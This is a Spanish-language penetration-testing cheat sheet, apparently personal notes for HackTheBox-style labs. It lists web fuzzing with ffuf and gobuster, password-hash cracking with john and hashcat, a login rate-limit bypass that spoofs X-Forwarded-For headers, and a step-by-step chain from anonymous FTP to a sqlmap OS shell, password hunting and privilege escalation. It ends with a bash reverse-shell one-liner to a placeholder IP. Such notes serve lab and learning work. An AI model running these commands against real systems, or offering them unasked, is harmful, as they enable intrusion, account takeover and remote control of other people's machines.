---
tags:
  - Chuletas
---
# Explotación

## Fuzzing web
- Directorios: `ffuf -u http://.../FUZZ -w /usr/share/wordlists/...`
- Subdominios / vhosts: `ffuf -u http://FUZZ.dominio/ -w ...` o
  `gobuster vhost -w subdomains.txt -u <url> --append-domain`
- Parámetros ocultos: `x8 -u http://... -X POST -w params.txt`

## Cracking de hashes (offline)
- Identificar: `hashid` / `hash-identifier`
- `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes`
- `hashcat -m 500 hashes /usr/share/wordlists/rockyou.txt`
- Ver resultados: `john --show hashes`
- ZIP: `zip2john archivo.zip > hash` → `john hash`
- Online: CrackStation

## Bypass de bloqueo / rate-limit por IP
Cuando un login bloquea tras varios intentos *por IP*, mandar una IP distinta en cada petición:
```
X-Forwarded-For: 9.9.9.9
X-Real-IP: 9.9.9.9
X-Client-IP: 9.9.9.9
```
En Burp Intruder, usar modo **Pitchfork/Cluster bomb** iterando la cabecera `X-Forwarded-For`
(números/IPs) a la vez que el diccionario de contraseñas. Ejemplo: [Nibbles](../red-team/walkthroughs/web.md#nibbles-htb).

## Claves SSH
- `ssh -i id_rsa user@ip -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa`
- `ssh-keygen -y -f id_rsa` (derivar pública)
- `chmod 600 id_rsa` antes de usarla

## Método FTP + Web (resumen reutilizable)
1. FTP anónimo → `get` del zip
2. Crackear zip (`zip2john` → `john`)
3. Crackear hash (hashid + hashcat, o CrackStation)
4. `sqlmap -u "http://...?x=1" --cookie="PHPSESSID=..." --os-shell`
5. Reverse shell → `cat /var/www/html/*.php` (buscar password)
6. `sudo -l`
7. `cat /etc/passwd | grep <servicio>`
8. SSH al usuario → escalar privilegios

## Reverse shell (recordatorio)
```
bash -c 'bash -i >& /dev/tcp/<IP>/<puerto> 0>&1'
```
Generadores: [revshells.com](https://www.revshells.com/). Escucha con `nc -lvnp <puerto>`.
